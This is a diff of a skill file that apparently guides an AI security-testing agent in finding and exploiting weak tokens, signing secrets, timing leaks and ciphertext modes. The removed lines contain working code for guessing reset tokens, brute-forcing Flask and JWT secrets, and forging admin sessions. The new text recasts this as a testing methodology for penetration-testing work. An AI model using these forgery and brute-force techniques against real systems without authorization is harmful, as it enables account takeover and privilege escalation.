@@ -2,175 +2,199 @@
 name: crypto-weakness
 description: Identifying and exploiting weak cryptographic implementations including predictable tokens, weak hashes, and insecure session management
 metadata:
-  version: '1.0'
+  version: 1.0.0
 ---
 
 # Cryptographic Weakness
 
-Weak cryptography in session management, token generation, or data storage leads to authentication bypass, account takeover, and privilege escalation. The most impactful targets are session tokens, password resets, CSRF tokens, and "remember me" cookies.
+Weak cryptography in session management, token generation, or data storage leads to authentication bypass, account takeover, and privilege escalation. The most impactful targets are session tokens, password resets, anti-CSRF tokens, and "remember me" cookies.
 
-## Session Token Analysis
+## Attack Surface
 
-**Always decode and inspect session tokens:**
+- **Structured tokens**: session cookies, access and refresh artifacts, identity assertions.
+- **Recovery and proof artifacts**: password reset, email confirmation, invite, unlock, share links.
+- **Keyed checksums**: signed session blobs, signed state carriers, signed upload descriptors.
+- **Machine-issued values**: API keys, device codes, one-time codes, anti-forgery tokens.
+- **At-rest material**: stored digests, embedded keys, seeded secrets, static placeholders.
+- **Encrypted at-rest material**: stored ciphertext blocks, encrypted cookies, and encrypted columns whose confidentiality rests on the cipher and its initialisation value.
 
-```python
-import base64, json, hashlib
+## Reconnaissance
 
-# Flask session (base64-encoded JSON)
-cookie = "eyJ1c2VyX2lkIjoxMDMyLCJyb2xlIjoidXNlciJ9...."
-payload = cookie.split(".")[0]
-payload += "=" * (4 - len(payload) % 4)
-data = json.loads(base64.urlsafe_b64decode(payload))
-print(data)  # {"user_id": 1032, "role": "user"}
+### Decode and Inspect
 
-# JWT (three base64 parts)
-import jwt
-header_b64, payload_b64, sig = cookie.split(".")
-header = json.loads(base64.urlsafe_b64decode(header_b64 + "=="))
-claims = json.loads(base64.urlsafe_b64decode(payload_b64 + "=="))
-print(header)  # {"alg": "HS256", "typ": "JWT"}
-print(claims)  # {"sub": "user123", "role": "user", "exp": ...}
-```
+- **Immediate decoding**: decode every issued value immediately: a structured token often carries identity, role, and lifetime in clear form.
+- **Structure recording**: record structure per artifact: segment count, alphabet, length, casing, fixed versus variable fields.
+- **Algorithm marker**: note the algorithm marker and whether a signature segment is present.
 
-**Predictability patterns to look for:**
-- Token contains user_id, timestamp, or sequential counter → forgeable
-- Token is MD5/SHA1 of username or email → crackable
-- Token length < 16 bytes → brute-forceable
-- Token only contains hex characters of fixed length → likely hash of known input
+### Sampling
 
-## Weak Hash Exploitation
+- **Batch collection**: collect a batch of values per artifact from repeated issuance, from several principals, and from several roles.
+- **Channel capture**: capture the same artifact across channels (web, mobile, API) to compare issuance paths.
+- **Invalid candidate**: keep one known-invalid candidate of the same shape to calibrate acceptance verdicts.
 
-**When passwords or tokens are hashed with MD5/SHA1:**
-```python
-import hashlib, requests
+## Detection Channels
 
-# If token is MD5(username) or MD5(email):
-username = "admin"
-token = hashlib.md5(username.encode()).hexdigest()
-print(f"MD5(admin) = {token}")  # Try as password reset token
+- **Decoded predictable fields**: showing embedded counters or timestamps or identifiers.
+- **Duplicate tokens**: across repeated issuance showing absent randomness.
+- **Short token length**: below the strong-randomness bound.
+- **Fixed-length restricted-alphabet structure**: showing a digest-of-known-input shape.
+- **Accepted predicted token**: confirming a valid session or recovery action.
+- **Rejected candidate verdict**: per derivation closes that derivation hypothesis.
+- **Signature segment**: present on structured tokens marking the keyed-checksum binding.
+- **Algorithm marker**: showing a symmetric scheme or an unchecked acceptance option.
+- **Local re-verification success**: confirming a recovered secret without server contact.
+- **Accepted minted token**: carrying elevated claims confirming signature trust failure.
+- **Rejected stripped-algorithm token**: closing the removal hypothesis for that flow.
+- **Timing baseline**: over known-invalid tokens showing stable reference behaviour.
+- **Timing differential**: of a correct prefix over baseline with statistical separation.
+- **Acceptance verdict**: on the fully extracted token confirming the recovered value.
+- **Flat timing distribution**: across all prefixes signalling constant-time comparison.
+- **Error-class stability**: showing timing differences are comparison-driven rather than transport-driven.
+- **Block-aligned repetition**: identical ciphertext segments at different plaintext positions, which show a mode that leaks plaintext structure.
+- **Initialisation reuse or drift**: one initialisation value across several samples, or one that advances with a counter or a timestamp, so equal plaintext prefixes produce equal ciphertext.
 
-# SHA1 variants
-token_sha1 = hashlib.sha1(username.encode()).hexdigest()
-token_sha1_lower = hashlib.sha1(username.lower().encode()).hexdigest()
+## Adversarial Capabilities
 
-# Test all variants
-for tok in [token, token_sha1, token_sha1_lower]:
-    r = requests.get(f"http://target/reset?token={tok}")
-    if r.status_code == 200 and "error" not in r.text.lower():
-        print(f"Valid token: {tok}")
-```
+- **Prerequisites**: cryptographic testing presupposes issued artifacts, sampling volume, and offline computation, and it consumes all three.
+- **Batch collection**: collect a batch of issued values from repeated flows and several principals.
+- **Offline decoding**: decode and re-encode each artifact without touching the server.
+- **Derivation computation**: compute candidate derivations offline from known identifiers, plaintext candidates, and candidate keys.
+- **Local verification**: verify key guesses locally against a captured signature before spending them at the endpoint.
+- **Timing measurement**: measure response timing and error classes across repeated equivalent requests.
+- **Artifact replay**: replay a minted artifact at the accepting endpoint under a chosen identity.
 
-**Rainbow table / online lookup:**
-```python
-import requests
+## Trust Assumptions
 
-def crack_hash_online(hash_value):
-    # Try hashes.com API
-    r = requests.get(f"https://hashes.com/en/api/identifier?hash={hash_value}")
-    return r.json()
+- **The agreement**: the class rests on one agreement: the value of the artifact is what authorizes its holder, so the value must be unpredictable to anyone who did not receive it. The agreement holds the artifact free of recoverable structure, holds its random space wide enough to defeat search, holds the verification secret unguessable, and holds the comparison free of side channels. Sensitive position leaks when any clause fails: the artifact can be re-derived, the key recovered offline, or the correct value extracted byte by byte. The agreement also covers encrypted at-rest material: the class tests that the cipher and its initialisation keep stored material confidential, and a weak mode or a reused or predictable initialisation value discloses plaintext structure without any key recovery. Recovery and session artifacts carry the same root because the same generator issues both.
+- **The failing clause**: each variant breaks one clause: the structure and randomness clause, the key clause, or the comparison clause.
 
-# For known plaintexts (username, email, phone):
-candidates = ["admin", "administrator", "root", "user@example.com"]
-for plaintext in candidates:
-    for algo in [hashlib.md5, hashlib.sha1, hashlib.sha256]:
-        h = algo(plaintext.encode()).hexdigest()
-        print(f"{algo.__name__}({plaintext}) = {h}")
-```
+## Key Vulnerabilities
 
-## JWT Secret Brute-Force
+### Structured Token Inspection
 
-```bash
-# flask-unsign for Flask sessions
-pip install flask-unsign flask-unsign[wordlist]
-flask-unsign --unsign --cookie "<cookie>" --no-literal-eval
-# With wordlist
-flask-unsign --unsign --cookie "<cookie>" --wordlist /path/to/wordlist.txt
+- **Decoded payloads**: often carry identity, role, expiry, and tenant in clear form; the signature protects integrity, not confidentiality.
+- **Signed-but-readable artifacts**: treat any signed-but-readable artifact as a claim set to target: what the verifier reads is what the attacker can rewrite once the signing clause fails.
+- **Trusted claims**: record which claims the verifier trusts (identity, role, scope, lifetime) and whether it re-derives any of them.
 
-# hashcat for JWT HS256
-# Extract the signing input: header.payload
-# hashcat -a 0 -m 16500 "<header>.<payload>.<signature>" wordlist.txt
-```
+### Predictable Token Patterns
 
-**Common weak secrets to test:**
-```python
-weak_secrets = [
-    "secret", "secret_key", "your_secret_key", "change_me", "changeme",
-    "supersecret", "flask_secret", "development", "debug", "test",
-    app_name, domain_name, "password", "1234567890",
-]
-```
+- **Embedded counters, timestamps, or identifiers**: make the next value derivable from samples.
+- **Digest-of-known-input values**: values that are digests of known input (identifier, email, hostname) are recomputable offline.
+- **Fixed length with a restricted alphabet**: marks a hashed value rather than a random one.
+- **Short values**: fall to brute force or lookup tables; repeated values across issuance show a static source.
 
-## Token Forgery
+### Guessable Signing Secrets
 
-**Once weak hash/secret is found, forge elevated tokens:**
+- **Placeholder and product-derived secrets**: placeholder, dictionary, and product-derived secrets appear in default configurations and copied deployments.
+- **Local key verification**: a key guess is verified locally against one captured signature before it is spent at the endpoint.
+- **Derived-value guessing**: values derived from the domain, the product name, or the environment are tried alongside wordlists.
+- **Key-source resolution**: where the verifier derives its key basis from artifact-carried input, the key basis is attacker-supplied rather than recovered; name the signing-key variant for the resolution step and the authentication-jwt skill for the token-header shapes.
 
-```python
-from flask.sessions import SecureCookieSessionInterface
-from itsdangerous import URLSafeTimedSerializer
-import hashlib
+### Digest-of-Known-Input Derivation
 
-secret = "your_secret_key"  # discovered secret
+- **Digest recomputation**: recovery tokens computed as a digest of the identifier are recomputed for each candidate identifier and replayed.
+- **Normalisation variants**: case, whitespace, and alternate-identifier normalisations produce further candidates that still verify.
+- **Precomputed tables**: precomputed tables and lookup services answer for common plaintexts without server contact.
 
-# Flask session forgery
-s = URLSafeTimedSerializer(secret, salt='cookie-session',
-    signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1})
-forged = s.dumps({"user_id": 1, "role": "admin", "is_admin": True})
+### Token Forgery
 
-# JWT forgery  
-import jwt
-forged_jwt = jwt.encode(
-    {"sub": "admin", "role": "administrator", "exp": 9999999999},
-    secret, algorithm="HS256"
-)
-```
+- **Signing-clause recovery**: recover the signing clause once the secret or the checksum source is known, then mint claims the verifier trusts.
+- **Claim-set targeting**: decode a genuine artifact to read the claim names that control identity, role, and tenant, then mint only those claims under the recovered or attacker-supplied key basis.
+- **Elevation targets**: identity of another principal, role or privilege flags, extended lifetime, widened scope.
+- **Local re-verification**: re-verify the forged artifact locally before replaying it, so a rejected replay attributes to binding rather than construction.
 
-## Timing Attack on Token Comparison
+### Comparison Weakness
 
-When tokens are compared with `==` (not constant-time), timing differences reveal valid tokens:
+- **Byte-by-byte comparison**: verification that compares values byte by byte without constant time leaks prefix correctness.
+- **Amplification conditions**: the leak is amplified where tokens are long, comparison is repeated, and the endpoint tolerates many attempts.
+- **Timing-work prerequisites**: timing work needs a calibrated baseline over known-invalid values and statistical separation over noise.
 
-```python
-import requests, time, statistics
+### Ciphertext Confidentiality
 
-def measure_response_time(token, n=5):
-    times = []
-    for _ in range(n):
-        start = time.perf_counter()
-        requests.get(f"http://target/verify?token={token}")
-        times.append(time.perf_counter() - start)
-    return statistics.mean(times)
+- **Block-aligned leakage**: a mode that encrypts equal plaintext blocks to equal ciphertext blocks exposes structure and repetition in stored material without any key recovery.
+- **Initialisation reuse**: a reused or predictable initialisation value makes equal plaintext prefixes produce equal ciphertext, so one sample answers for many.
+- **Weak random source**: a non-cryptographic generator behind key or initialisation creation turns the value into a guessable one, so the search space for the secret step above collapses.
 
-# Test known-invalid vs candidate tokens
-baseline = measure_response_time("0" * 32)
-for prefix in "0123456789abcdef":
-    t = measure_response_time(prefix + "0" * 31)
-    if t > baseline * 1.1:
-        print(f"Prefix {prefix} is likely correct (t={t:.4f}s vs {baseline:.4f}s)")
-```
+## Advanced Techniques
 
-## Entropy Analysis
+### Timing Oracle Refinement
 
-**Collect multiple tokens to assess entropy:**
-```python
-import requests, math, collections
+- **Baseline calibration**: calibrate a baseline over known-invalid candidates, then iterate candidate prefixes position by position.
+- **Noise separation**: separate comparison-driven differences from transport noise by repeating each sample and watching error classes.
+- **Stop condition**: stop when the extracted value verifies, or when a flat distribution across all prefixes reports constant-time comparison.
 
-tokens = []
-for _ in range(20):
-    r = requests.get("http://target/reset?user=testuser")
-    token = extract_token_from_response(r)
-    tokens.append(token)
+### Entropy and Sampling Analysis
 
-# Check for patterns
-print("Lengths:", set(len(t) for t in tokens))
-print("Unique:", len(set(tokens)))  # Should be 20 for secure tokens
-# If tokens are sequential/predictable, they'll cluster
-```
+- **Sample counts**: sample counts in the tens per artifact: unique-value counts, length variety, and shared prefixes reveal the generator.
+- **Sample clustering**: cluster samples by issuance time and by principal to separate counter-driven from time-driven and identity-driven fields.
+- **Strong-randomness verdict**: a generator verdict of strong randomness redirects effort to key and comparison clauses.
+
+### Rotation and Retirement Windows
+
+- **Retired-key validity**: values issued under a retired key or a previous generator version stay valid inside an overlap window.
+- **Rotation-boundary sampling**: sampling across a rotation boundary shows whether the retirement is enforced at verification or only at issuance.
+
+### Ciphertext Structure Analysis
+
+- **Sample comparison first**: compare ciphertext samples for repeated blocks and repeated initialisation values before attempting any key work.
+- **Structure recovery**: recover plaintext structure from a mode that preserves block equality, and search the seed space where the initialisation value advances predictably.
+- **Stop signal**: a mode that randomises every block under a unique unpredictable initialisation value closes this line rather than inviting more samples.
+
+## Bypass Techniques
+
+- **Bypass scope**: bypass shapes slip past a check that is present, so each one is tried after the baseline verdict reports enforcement.
+- **Normalisation differences**: case and encoding normalisation differences between minting and verification widen the candidate set that still verifies.
+- **Tolerant acceptance**: padding and truncation tolerated by the accepting endpoint let a shortened candidate verify.
+- **Second carrier**: the same artifact presented over a second transport or endpoint whose check is weaker.
+- **Retired-key overlap**: retired keys and previous generator versions accepted during a rotation overlap.
+- **Spelling folding**: alternate identifier spellings accepted by the derivation path while the lookup stays on the canonical one.
+- **Family handoff**: name the defence-bypass family at the normalisation, tolerant-acceptance, and spelling-folding steps, and the proxy-techniques family at the second-carrier step, rather than restating those mechanics here.
+- **Extended reading**: when this section does not fulfil the knowledge gap, extend the reading with the defence-bypass and proxy-techniques families.
+
+## Chaining Attacks
+
+- **Predictable recovery artifact**: account takeover → durable access.
+- **Recovered signing key**: forged session artifact → privilege escalation.
+- **Weak session artifact**: replay against a second service that checks only the signature.
+- **Timing oracle**: full value recovery → reuse in any downstream action the artifact authorizes.
+- **Crypto weakness plus an authorization gap**: the forged identity then reaches resources the original holder could not.
+
+## Testing Methodology
+
+1. **Inventory artifacts** - List every issued value with its carrier, lifetime, and accepting endpoint; the step completes when each artifact carries a carrier and a lifetime.
+2. **Sample and decode** - Collect a batch per artifact and decode structure and claims; the step completes when every artifact is recorded as structured or opaque with its fields.
+3. **Test predictability** - Compare samples within and across principals for counters, timestamps, shared prefixes, and repeats; the step completes when each artifact carries a predictable or random verdict.
+4. **Derive candidates** - For digest-shaped artifacts compute candidates from known identifiers and plaintext candidates; the step completes when every derivation carries an acceptance verdict.
+5. **Test key guesses** - Verify candidate secrets locally against a captured signature, then at the endpoint; the step completes when the secret is recovered or the candidate space is exhausted with each family recorded.
+6. **Forge and replay** - Mint the elevated claims and replay at the accepting endpoint; the step completes when acceptance or rejection is recorded with the receiving context.
+7. **Measure comparison** - Calibrate a baseline and iterate prefixes with repeated samples; the step completes when timing separation is proven or constant-time comparison is recorded.
+8. **Test ciphertext confidentiality** - Collect encrypted samples and compare them for repeated blocks and reused or predictable initialisation values; the step completes when each encrypted store carries a cipher and initialisation verdict.
+
+## Variants
+
+- crypto-predictable-token - Predict recovery and session artifacts from embedded counters or digest-of-known-input structure, or enumerate a space small enough for the validity window, and confirm candidates at the accepting endpoint.
+- crypto-signing-key-forgery - Forge signed artifacts under a recovered key, or strip signature validation when an unchecked algorithm accepts keyless values.
+- crypto-timing-oracle - Extract the value through comparison timing when verification leaks prefix correctness, iterating prefixes against a calibrated baseline.
+
+## False Positives
+
+- **Long random values**: long random values that decode to nothing meaningful and share no structure across samples.
+- **Full-binding artifacts**: artifacts that verify only under a full binding of identity plus audience plus lifetime, and expire quickly.
+- **Vanishing timing differences**: timing differences that vanish under repetition, or that match the endpoint's normal variance.
+- **Failed derivations**: candidate derivations that fail acceptance at every endpoint, which marks a strong random source rather than a weak one.
+- **Randomised encryption**: encrypted material whose mode randomises every block under a unique unpredictable initialisation value, with no reuse across samples.
 
 ## Pro Tips
 
-1. Always decode session cookies/tokens immediately — they often contain exploitable claims
-2. MD5 and SHA1 tokens derived from known values (username/email) are trivially crackable
-3. Flask's default secret key `your_secret_key` / `change_me` is extremely common in CTFs
-4. JWT `alg: none` bypass: remove the signature entirely and set alg to none
-5. Token length < 128 bits is exploitable with brute force or rainbow tables
-6. Collect 5-10 tokens and look for sequential IDs or timestamps embedded in them
-7. Test `role: admin`, `is_admin: true`, `user_id: 1` in forged tokens
+- **Immediate decoding**: decode every session cookie and token immediately; claims often travel in clear form.
+- **Offline recomputation**: digests of known values (identifier, email, hostname) are recomputed offline before any guessing.
+- **Default-secret priority**: default and placeholder secrets are the fastest win; try product-derived and environment-derived values next.
+- **Stripped-signature acceptance**: stripped-signature acceptance belongs to the unchecked-algorithm clause; test it where pinning is unclear.
+- **Short values**: values shorter than the strong-randomness bound fall to brute force or tables.
+- **Sample volume**: collect 5-10 samples per artifact and look for counters, timestamps, and shared prefixes inside them.
+- **End-to-end confirmation**: mint elevated claims and confirm acceptance end to end; a local re-verification success is not yet a finding.
+- **Suite sweep**: run the whole forgery suite across every mode before manual chaining; one automated pass finds the weak mode faster than a hand-built chain.
+
+## Summary
+
+A token is only as strong as its unpredictability, its key, its comparison, and the confidentiality of the material it protects. Weak generation, guessable keys, leaky comparison, and weak at-rest encryption each convert a held artifact into account takeover or privilege escalation.
